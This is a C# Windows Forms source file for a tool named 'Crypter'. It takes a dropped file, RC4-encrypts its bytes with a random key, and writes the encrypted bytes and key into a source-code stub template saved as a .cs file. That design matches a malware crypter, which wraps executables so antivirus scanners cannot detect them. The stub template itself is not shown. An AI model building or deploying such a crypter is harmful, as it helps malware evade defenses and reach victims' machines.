using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Crypter.Properties;
using Microsoft.VisualBasic.CompilerServices;

namespace Crypter
{
    public partial class Form1 : Form
    {
		private static string Randomstring = "test";
		private static Random random = new Random();
		private static List<String> names = new List<string>();
		public Form1()
        {
            InitializeComponent();
			Randomstring = random_string(8);

		}

		public static string random_string(int length)
		{
			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			string name = "";
			do
			{
				name = new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
			} while (names.Contains(name));

			return name;
		}

		private void label1_DragDrop(object sender, DragEventArgs e)
        {
            string filepath = ((Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();
            
            byte[] b = File.ReadAllBytes(filepath);
            string contents = Resources.String1.Replace("lol", Conversions.ToString(this.Brc4(b))).Replace("kkkkk", Randomstring);
            using (SaveFileDialog saveFile = new SaveFileDialog())
            {
                saveFile.Filter = "Source Code (*.cs)|*.cs";

                if (saveFile.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFile.FileName, contents);
                }
            }
        }
        public object Brc4(byte[] b2)
        {
            StringBuilder stringBuilder = new StringBuilder();
            byte[] array = this.RC4Encrypt(b2);
            foreach (byte value in array)
            {
                stringBuilder.Append(value);
                stringBuilder.Append(",");
            }
            return stringBuilder.ToString().Remove(checked(stringBuilder.Length - 1));
        }

		private byte[] RC4Encrypt(byte[] key)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(Randomstring);
			uint[] array = new uint[256];
			checked
			{
				byte[] array2 = new byte[key.Length - 1 + 1];
				uint num = 0U;
				uint num2;
				uint num3;
				do
				{
					array[(int)num] = num;
					num += 1U;
					num2 = num;
					num3 = 255U;
				}
				while (num2 <= num3);
				num = 0U;
				uint num4 = 0;
				uint num6;
				do
				{
					num4 = (uint)(unchecked((ulong)(checked(num4 + (uint)bytes[(int)(unchecked((ulong)num % (ulong)((long)bytes.Length)))] + array[(int)num]))) & 255UL);
					uint num5 = array[(int)num];
					array[(int)num] = array[(int)num4];
					array[(int)num4] = num5;
					num += 1U;
					num6 = num;
					num3 = 255U;
				}
				while (num6 <= num3);
				num = 0U;
				num4 = 0U;
				int num7 = 0;
				int num8 = array2.Length - 1;
				int num9 = num7;
				for (; ; )
				{
					int num10 = num9;
					int num11 = num8;
					if (num10 > num11)
					{
						break;
					}
					num = (uint)(unchecked((ulong)num) + 1UL & 255UL);
					num4 = (uint)(unchecked((ulong)(checked(num4 + array[(int)num]))) & 255UL);
					uint num5 = array[(int)num];
					array[(int)num] = array[(int)num4];
					array[(int)num4] = num5;
					array2[num9] = (byte)((uint)key[num9] ^ array[(int)(unchecked((ulong)(checked(array[(int)num] + array[(int)num4]))) & 255UL)]);
					num9++;
				}
				return array2;
			}
		}

		private void label1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Link;
            else e.Effect = DragDropEffects.None;
        }
    }
}
